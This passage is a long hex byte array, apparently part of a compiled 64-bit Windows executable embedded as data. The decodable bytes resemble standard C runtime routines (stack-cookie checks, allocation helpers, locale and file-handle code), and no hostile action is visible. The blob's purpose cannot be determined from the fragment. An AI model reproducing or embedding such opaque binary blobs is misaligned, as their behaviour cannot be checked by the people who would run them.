0x74, 0x24, 0x18, 0x5f, 0xc3, 0xf, 0x1f, 0x0, 0x72, 0xa6, 0x0, 0x0, 0x79, 0xa6, 0x0, 0x0, 0x80, 0xa6, 0x0, 0x0, 0x87, 0xa6, 0x0, 0x0, 0x8e, 0xa6, 0x0, 0x0, 0x95, 0xa6, 0x0, 0x0, 0x9c, 0xa6, 0x0, 0x0, 0xa3, 0xa6, 0x0, 0x0, 0xaa, 0xa6, 0x0, 0x0, 0xb1, 0xa6, 0x0, 0x0, 0xb8, 0xa6, 0x0, 0x0, 0xbf, 0xa6, 0x0, 0x0, 0xc6, 0xa6, 0x0, 0x0, 0xcd, 0xa6, 0x0, 0x0, 0xd4, 0xa6, 0x0, 0x0, 0x2e, 0xa7, 0x0, 0x0, 0x3d, 0xa7, 0x0, 0x0, 0x4c, 0xa7, 0x0, 0x0, 0x5b, 0xa7, 0x0, 0x0, 0x6a, 0xa7, 0x0, 0x0, 0x76, 0xa7, 0x0, 0x0, 0x82, 0xa7, 0x0, 0x0, 0x8e, 0xa7, 0x0, 0x0, 0x9a, 0xa7, 0x0, 0x0, 0xa6, 0xa7, 0x0, 0x0, 0xb2, 0xa7, 0x0, 0x0, 0xbe, 0xa7, 0x0, 0x0, 0xca, 0xa7, 0x0, 0x0, 0xd6, 0xa7, 0x0, 0x0, 0xe2, 0xa7, 0x0, 0x0, 0xee, 0xa7, 0x0, 0x0, 0x6c, 0xa8, 0x0, 0x0, 0x73, 0xa8, 0x0, 0x0, 0x7a, 0xa8, 0x0, 0x0, 0x81, 0xa8, 0x0, 0x0, 0x88, 0xa8, 0x0, 0x0, 0x8f, 0xa8, 0x0, 0x0, 0x96, 0xa8, 0x0, 0x0, 0x9d, 0xa8, 0x0, 0x0, 0xa4, 0xa8, 0x0, 0x0, 0xab, 0xa8, 0x0, 0x0, 0xb2, 0xa8, 0x0, 0x0, 0xb9, 0xa8, 0x0, 0x0, 0xc0, 0xa8, 0x0, 0x0, 0xc7, 0xa8, 0x0, 0x0, 0xce, 0xa8, 0x0, 0x0, 0xd5, 0xa8, 0x0, 0x0, 0x45, 0x33, 0xc0, 0xe9, 0x0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x14, 0xe8, 0x6e, 0xc1, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x27, 0xc0, 0xff, 0xff, 0x33, 0xc0, 0xeb, 0x60, 0x48, 0x85, 0xdb, 0x74, 0xe7, 0x48, 0x3b, 0xfb, 0x73, 0xf2, 0x49, 0x8b, 0xd0, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x54, 0xcc, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8d, 0x53, 0xff, 0x83, 0x79, 0x8, 0x0, 0x74, 0x24, 0x48, 0xff, 0xca, 0x48, 0x3b, 0xfa, 0x77, 0xa, 0xf, 0xb6, 0x2, 0xf6, 0x44, 0x8, 0x19, 0x4, 0x75, 0xee, 0x48, 0x8b, 0xcb, 0x48, 0x2b, 0xca, 0x48, 0x8b, 0xd3, 0x83, 0xe1, 0x1, 0x48, 0x2b, 0xd1, 0x48, 0xff, 0xca, 0x80, 0x7c, 0x24, 0x38, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x48, 0x8b, 0xc2, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0x40, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x60, 0x48, 0x8d, 0x6c, 0x24, 0x30, 0x48, 0x89, 0x5d, 0x60, 0x48, 0x89, 0x75, 0x68, 0x48, 0x89, 0x7d, 0x70, 0x48, 0x8b, 0x5, 0x86, 0xe6, 0x0, 0x0, 0x48, 0x33, 0xc5, 0x48, 0x89, 0x45, 0x20, 0x44, 0x8b, 0xea, 0x45, 0x8b, 0xf9, 0x48, 0x8b, 0xd1, 0x4d, 0x8b, 0xe0, 0x48, 0x8d, 0x4d, 0x0, 0xe8, 0xbe, 0xcb, 0xff, 0xff, 0x8b, 0xbd, 0x88, 0x0, 0x0, 0x0, 0x85, 0xff, 0x75, 0x7, 0x48, 0x8b, 0x45, 0x8, 0x8b, 0x78, 0xc, 0xf7, 0x9d, 0x90, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xcf, 0x4d, 0x8b, 0xc4, 0x8b, 0xcf, 0x1b, 0xd2, 0x83, 0x64, 0x24, 0x28, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x83, 0xe2, 0x8, 0xff, 0xc2, 0xe8, 0x50, 0xda, 0xff, 0xff, 0x4c, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0x7, 0x33, 0xff, 0xe9, 0xda, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xf6, 0x48, 0x3, 0xf6, 0x48, 0x8d, 0x46, 0x10, 0x48, 0x3b, 0xf0, 0x48, 0x1b, 0xc9, 0x48, 0x23, 0xc8, 0xf, 0x84, 0xa7, 0x0, 0x0, 0x0, 0x48, 0x81, 0xf9, 0x0, 0x4, 0x0, 0x0, 0x77, 0x31, 0x48, 0x8d, 0x41, 0xf, 0x48, 0x3b, 0xc1, 0x77, 0xa, 0x48, 0xb8, 0xf0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf, 0x48, 0x83, 0xe0, 0xf0, 0xe8, 0x38, 0x37, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8d, 0x5c, 0x24, 0x30, 0x48, 0x85, 0xdb, 0x74, 0x1f, 0xc7, 0x3, 0xcc, 0xcc, 0x0, 0x0, 0xeb, 0x13, 0xe8, 0x7e, 0xed, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xc7, 0x0, 0xdd, 0xdd, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x10, 0x48, 0x8b, 0xc3, 0x48, 0x85, 0xdb, 0x74, 0x50, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x48, 0x8b, 0xcb, 0xe8, 0xb7, 0x7c, 0xff, 0xff, 0x45, 0x8b, 0xcf, 0x44, 0x89, 0x74, 0x24, 0x28, 0x4d, 0x8b, 0xc4, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xba, 0x1, 0x0, 0x0, 0x0, 0x8b, 0xcf, 0xe8, 0xa7, 0xd9, 0xff, 0xff, 0x44, 0x8b, 0xc0, 0x48, 0x8b, 0xc3, 0x45, 0x85, 0xc0, 0x74, 0x1c, 0x4c, 0x8b, 0x8d, 0x80, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd3, 0x41, 0x8b, 0xcd, 0xff, 0x15, 0x7d, 0x46, 0x0, 0x0, 0x8b, 0xf8, 0x48, 0x8b, 0xc3, 0xeb, 0x9, 0x33, 0xc0, 0x33, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x11, 0x48, 0x8d, 0x48, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0x5, 0xe8, 0x2c, 0xc0, 0xff, 0xff, 0x80, 0x7d, 0x18, 0x0, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x0, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x8b, 0xc7, 0x48, 0x8b, 0x4d, 0x20, 0x48, 0x33, 0xcd, 0xe8, 0x9d, 0x33, 0x0, 0x0, 0x48, 0x8b, 0x5d, 0x60, 0x48, 0x8b, 0x75, 0x68, 0x48, 0x8b, 0x7d, 0x70, 0x48, 0x8d, 0x65, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x60, 0x48, 0x8d, 0x6c, 0x24, 0x50, 0x48, 0x89, 0x5d, 0x40, 0x48, 0x89, 0x75, 0x48, 0x48, 0x89, 0x7d, 0x50, 0x48, 0x8b, 0x5, 0xea, 0xe4, 0x0, 0x0, 0x48, 0x33, 0xc5, 0x48, 0x89, 0x45, 0x8, 0x48, 0x63, 0x75, 0x60, 0x4d, 0x8b, 0xe1, 0x48, 0x89, 0x55, 0x0, 0x45, 0x8b, 0xe8, 0x48, 0x8b, 0xd9, 0x85, 0xf6, 0x7e, 0x14, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xc9, 0xe8, 0x6b, 0x1b, 0x0, 0x0, 0x3b, 0xc6, 0x8d, 0x70, 0x1, 0x7c, 0x2, 0x8b, 0xf0, 0x44, 0x8b, 0x75, 0x78, 0x45, 0x85, 0xf6, 0x75, 0x7, 0x48, 0x8b, 0x3, 0x44, 0x8b, 0x70, 0xc, 0xf7, 0x9d, 0x80, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xce, 0x4d, 0x8b, 0xc4, 0x41, 0x8b, 0xce, 0x1b, 0xd2, 0x83, 0x64, 0x24, 0x28, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x83, 0xe2, 0x8, 0xff, 0xc2, 0xe8, 0xa0, 0xd8, 0xff, 0xff, 0x4c, 0x63, 0xf8, 0x85, 0xc0, 0xf, 0x84, 0x62, 0x2, 0x0, 0x0, 0x49, 0x8b, 0xc7, 0x48, 0x3, 0xc0, 0x48, 0x8d, 0x48, 0x10, 0x48, 0x3b, 0xc1, 0x48, 0x1b, 0xc0, 0x48, 0x23, 0xc1, 0xf, 0x84, 0x2d, 0x2, 0x0, 0x0, 0x48, 0xba, 0xf0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf, 0x48, 0x3d, 0x0, 0x4, 0x0, 0x0, 0x77, 0x2d, 0x48, 0x8d, 0x48, 0xf, 0x48, 0x3b, 0xc8, 0x77, 0x3, 0x48, 0x8b, 0xca, 0x48, 0x83, 0xe1, 0xf0, 0x48, 0x8b, 0xc1, 0xe8, 0x86, 0x35, 0x0, 0x0, 0x48, 0x2b, 0xe1, 0x48, 0x8d, 0x7c, 0x24, 0x50, 0x48, 0x85, 0xff, 0x74, 0x22, 0xc7, 0x7, 0xcc, 0xcc, 0x0, 0x0, 0xeb, 0x16, 0x48, 0x8b, 0xc8, 0xe8, 0xc9, 0xeb, 0xff, 0xff, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xc7, 0x0, 0xdd, 0xdd, 0x0, 0x0, 0x48, 0x83, 0xc7, 0x10, 0x48, 0x8b, 0xdf, 0x48, 0x85, 0xff, 0xf, 0x84, 0xca, 0x1, 0x0, 0x0, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x44, 0x8b, 0xce, 0x4d, 0x8b, 0xc4, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xba, 0x1, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xce, 0xe8, 0xfa, 0xd7, 0xff, 0xff, 0x85, 0xc0, 0xf, 0x84, 0xa5, 0x1, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x40, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x41, 0x8b, 0xd5, 0x4c, 0x8b, 0x65, 0x0, 0x83, 0x64, 0x24, 0x28, 0x0, 0x49, 0x8b, 0xcc, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0xe8, 0x60, 0xdd, 0xff, 0xff, 0x48, 0x63, 0xf0, 0x85, 0xc0, 0xf, 0x84, 0x68, 0x1, 0x0, 0x0, 0xba, 0x0, 0x4, 0x0, 0x0, 0x44, 0x85, 0xea, 0x74, 0x52, 0x8b, 0x45, 0x70, 0x85, 0xc0, 0xf, 0x84, 0x2a, 0x1, 0x0, 0x0, 0x3b, 0xf0, 0xf, 0x8f, 0x4b, 0x1, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x40, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x41, 0x8b, 0xd5, 0x89, 0x44, 0x24, 0x28, 0x49, 0x8b, 0xcc, 0x48, 0x8b, 0x45, 0x68, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x8, 0xdd, 0xff, 0xff, 0x8b, 0xf0, 0x85, 0xc0, 0xf, 0x85, 0xe8, 0x0, 0x0, 0x0, 0xe9, 0xc, 0x1, 0x0, 0x0, 0x48, 0x8b, 0xce, 0x48, 0x3, 0xc9, 0x48, 0x8d, 0x41, 0x10, 0x48, 0x3b, 0xc8, 0x48, 0x1b, 0xc9, 0x48, 0x23, 0xc8, 0xf, 0x84, 0xc8, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xca, 0x77, 0x35, 0x48, 0x8d, 0x41, 0xf, 0x48, 0x3b, 0xc1, 0x77, 0xa, 0x48, 0xb8, 0xf0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf, 0x48, 0x83, 0xe0, 0xf0, 0xe8, 0x53, 0x34, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8d, 0x5c, 0x24, 0x50, 0x48, 0x85, 0xdb, 0xf, 0x84, 0x96, 0x0, 0x0, 0x0, 0xc7, 0x3, 0xcc, 0xcc, 0x0, 0x0, 0xeb, 0x13, 0xe8, 0x95, 0xea, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xc7, 0x0, 0xdd, 0xdd, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x10, 0x48, 0x85, 0xdb, 0x74, 0x72, 0x48, 0x83, 0x64, 0x24, 0x40, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x41, 0x8b, 0xd5, 0x89, 0x74, 0x24, 0x28, 0x49, 0x8b, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0x5e, 0xdc, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x31, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x33, 0xd2, 0x48, 0x21, 0x54, 0x24, 0x30, 0x44, 0x8b, 0xce, 0x8b, 0x45, 0x70, 0x4c, 0x8b, 0xc3, 0x41, 0x8b, 0xce, 0x85, 0xc0, 0x75, 0x2c, 0x21, 0x54, 0x24, 0x28, 0x48, 0x21, 0x54, 0x24, 0x20, 0xe8, 0xeb, 0xd6, 0xff, 0xff, 0x8b, 0xf0, 0x85, 0xc0, 0x75, 0x27, 0x48, 0x8d, 0x4b, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0x5, 0xe8, 0x3c, 0xbd, 0xff, 0xff, 0x33, 0xf6, 0x48, 0x8b, 0xdf, 0xeb, 0x2b, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x45, 0x68, 0x48, 0x89, 0x44, 0x24, 0x20, 0xeb, 0xce, 0x48, 0x8d, 0x4b, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0xe0, 0xe8, 0x15, 0xbd, 0xff, 0xff, 0xeb, 0xd9, 0x33, 0xdb, 0x33, 0xf6, 0x48, 0x85, 0xdb, 0x74, 0x11, 0x48, 0x8d, 0x4b, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0x5, 0xe8, 0xf9, 0xbc, 0xff, 0xff, 0x8b, 0xc6, 0x48, 0x8b, 0x4d, 0x8, 0x48, 0x33, 0xcd, 0xe8, 0x7b, 0x30, 0x0, 0x0, 0x48, 0x8b, 0x5d, 0x40, 0x48, 0x8b, 0x75, 0x48, 0x48, 0x8b, 0x7d, 0x50, 0x48, 0x8d, 0x65, 0x10, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xf2, 0x49, 0x8b, 0xd9, 0x48, 0x8b, 0xd1, 0x41, 0x8b, 0xf8, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0xe8, 0x1f, 0xc7, 0xff, 0xff, 0x8b, 0x84, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x89, 0x44, 0x24, 0x40, 0x4c, 0x8b, 0xcb, 0x8b, 0x84, 0x24, 0xb8, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xc7, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0xd6, 0x8b, 0x84, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0x84, 0x24, 0xa8, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x8b, 0x84, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x6f, 0xfc, 0xff, 0xff, 0x80, 0x7c, 0x24, 0x68, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x4c, 0x8d, 0x5c, 0x24, 0x70, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0xe3, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x7f, 0xd1, 0xff, 0xff, 0x33, 0xc9, 0x84, 0xc0, 0xf, 0x94, 0xc1, 0x8b, 0xc1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0x75, 0x19, 0xe8, 0x7a, 0xbb, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x33, 0xba, 0xff, 0xff, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x4c, 0x8b, 0xc1, 0x33, 0xd2, 0x48, 0x8b, 0xd, 0xf2, 0xf2, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0x48, 0xff, 0x25, 0x1f, 0x42, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0xa, 0x48, 0x8b, 0xca, 0xe8, 0x97, 0xe8, 0xff, 0xff, 0xeb, 0x1f, 0x48, 0x85, 0xdb, 0x75, 0x7, 0xe8, 0xbb, 0xbb, 0xff, 0xff, 0xeb, 0x11, 0x48, 0x83, 0xfb, 0xe0, 0x76, 0x2d, 0xe8, 0x16, 0xbb, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0xf6, 0xef, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xdf, 0x48, 0x8b, 0xcb, 0xe8, 0x9a, 0xdf, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xd3, 0x48, 0x8b, 0xd, 0x7f, 0xf2, 0x0, 0x0, 0x4c, 0x8b, 0xcb, 0x4c, 0x8b, 0xc7, 0x33, 0xd2, 0xff, 0x15, 0xb1, 0x41, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd1, 0xeb, 0xc4, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xf1, 0x48, 0x85, 0xc9, 0x74, 0x4a, 0x33, 0xdb, 0x4c, 0x8d, 0x3d, 0x1f, 0x4f, 0xff, 0xff, 0xbf, 0xe3, 0x0, 0x0, 0x0, 0x8d, 0x4, 0x1f, 0x41, 0xb8, 0x55, 0x0, 0x0, 0x0, 0x99, 0x49, 0x8b, 0xce, 0x2b, 0xc2, 0xd1, 0xf8, 0x48, 0x63, 0xe8, 0x48, 0x8b, 0xd5, 0x48, 0x8b, 0xf5, 0x48, 0x3, 0xd2, 0x49, 0x8b, 0x94, 0xd7, 0x50, 0x34, 0x1, 0x0, 0xe8, 0xf0, 0x16, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x29, 0x79, 0x5, 0x8d, 0x7d, 0xff, 0xeb, 0x3, 0x8d, 0x5d, 0x1, 0x3b, 0xdf, 0x7e, 0xc4, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0x48, 0x3, 0xf6, 0x49, 0x63, 0x84, 0xf7, 0x58, 0x34, 0x1, 0x0, 0x85, 0xc0, 0x78, 0xd6, 0x3d, 0xe4, 0x0, 0x0, 0x0, 0x73, 0xcf, 0x48, 0x3, 0xc0, 0x41, 0x8b, 0x84, 0xc7, 0xf0, 0x19, 0x1, 0x0, 0xeb, 0xc4, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0xba, 0x48, 0x0, 0x0, 0x0, 0x8d, 0x4a, 0xf8, 0xe8, 0x27, 0xba, 0xff, 0xff, 0x33, 0xf6, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x5b, 0x48, 0x8d, 0xa8, 0x0, 0x12, 0x0, 0x0, 0x48, 0x3b, 0xc5, 0x74, 0x4c, 0x48, 0x8d, 0x78, 0x30, 0x48, 0x8d, 0x4f, 0xd0, 0x45, 0x33, 0xc0, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0xe0, 0xd8, 0xff, 0xff, 0x48, 0x83, 0x4f, 0xf8, 0xff, 0x48, 0x8d, 0x4f, 0xe, 0x80, 0x67, 0xd, 0xf8, 0x8b, 0xc6, 0x48, 0x89, 0x37, 0xc7, 0x47, 0x8, 0x0, 0x0, 0xa, 0xa, 0xc6, 0x47, 0xc, 0xa, 0x40, 0x88, 0x31, 0xff, 0xc0, 0x48, 0xff, 0xc1, 0x83, 0xf8, 0x5, 0x72, 0xf3, 0x48, 0x83, 0xc7, 0x48, 0x48, 0x8d, 0x47, 0xd0, 0x48, 0x3b, 0xc5, 0x75, 0xb8, 0x48, 0x8b, 0xf3, 0x33, 0xc9, 0xe8, 0x33, 0xba, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x4a, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0xb1, 0x0, 0x12, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xf9, 0x48, 0x3b, 0xce, 0x74, 0x12, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0xd9, 0x3e, 0x0, 0x0, 0x48, 0x83, 0xc7, 0x48, 0x48, 0x3b, 0xfe, 0x75, 0xee, 0x48, 0x8b, 0xcb, 0xe8, 0xd8, 0xb9, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x8b, 0xf1, 0x81, 0xf9, 0x0, 0x20, 0x0, 0x0, 0x72, 0x29, 0xe8, 0xc, 0xb9, 0xff, 0xff, 0xbb, 0x9, 0x0, 0x0, 0x0, 0x89, 0x18, 0xe8, 0xc4, 0xb7, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x8b, 0x7c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0xc3, 0x33, 0xff, 0x8d, 0x4f, 0x7, 0xe8, 0x6e, 0xb3, 0xff, 0xff, 0x90, 0x8b, 0xdf, 0x8b, 0x5, 0x7d, 0xf4, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x3b, 0xf0, 0x7c, 0x36, 0x4c, 0x8d, 0x3d, 0x6d, 0xf0, 0x0, 0x0, 0x49, 0x39, 0x3c, 0xdf, 0x74, 0x2, 0xeb, 0x22, 0xe8, 0x90, 0xfe, 0xff, 0xff, 0x49, 0x89, 0x4, 0xdf, 0x48, 0x85, 0xc0, 0x75, 0x5, 0x8d, 0x78, 0xc, 0xeb, 0x14, 0x8b, 0x5, 0x4c, 0xf4, 0x0, 0x0, 0x83, 0xc0, 0x40, 0x89, 0x5, 0x43, 0xf4, 0x0, 0x0, 0x48, 0xff, 0xc3, 0xeb, 0xc1, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x70, 0xb3, 0xff, 0xff, 0x8b, 0xc7, 0xeb, 0x8a, 0x48, 0x63, 0xd1, 0x4c, 0x8d, 0x5, 0x26, 0xf0, 0x0, 0x0, 0x48, 0x8b, 0xc2, 0x83, 0xe2, 0x3f, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xd2, 0x49, 0x8b, 0x4, 0xc0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0xd9, 0x3d, 0x0, 0x0, 0xcc, 0x48, 0x63, 0xd1, 0x4c, 0x8d, 0x5, 0xfe, 0xef, 0x0, 0x0, 0x48, 0x8b, 0xc2, 0x83, 0xe2, 0x3f, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xd2, 0x49, 0x8b, 0x4, 0xc0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0xb9, 0x3d, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x63, 0xd9, 0x85, 0xc9, 0x78, 0x72, 0x3b, 0x1d, 0xbe, 0xf3, 0x0, 0x0, 0x73, 0x6a, 0x48, 0x8b, 0xc3, 0x4c, 0x8d, 0x35, 0xb2, 0xef, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x48, 0x8b, 0xf3, 0x48, 0xc1, 0xee, 0x6, 0x48, 0x8d, 0x3c, 0xc0, 0x49, 0x8b, 0x4, 0xf6, 0xf6, 0x44, 0xf8, 0x38, 0x1, 0x74, 0x47, 0x48, 0x83, 0x7c, 0xf8, 0x28, 0xff, 0x74, 0x3f, 0xe8, 0xa8, 0x14, 0x0, 0x0, 0x83, 0xf8, 0x1, 0x75, 0x27, 0x85, 0xdb, 0x74, 0x16, 0x2b, 0xd8, 0x74, 0xb, 0x3b, 0xd8, 0x75, 0x1b, 0xb9, 0xf4, 0xff, 0xff, 0xff, 0xeb, 0xc, 0xb9, 0xf5, 0xff, 0xff, 0xff, 0xeb, 0x5, 0xb9, 0xf6, 0xff, 0xff, 0xff, 0x33, 0xd2, 0xff, 0x15, 0x98, 0x3e, 0x0, 0x0, 0x49, 0x8b, 0x4, 0xf6, 0x48, 0x83, 0x4c, 0xf8, 0x28, 0xff, 0x33, 0xc0, 0xeb, 0x16, 0xe8, 0xa5, 0xb7, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0x7a, 0xb7, 0xff, 0xff, 0x83, 0x20, 0x0, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x83, 0xf9, 0xfe, 0x75, 0x15, 0xe8, 0x4e, 0xb7, 0xff, 0xff, 0x83, 0x20, 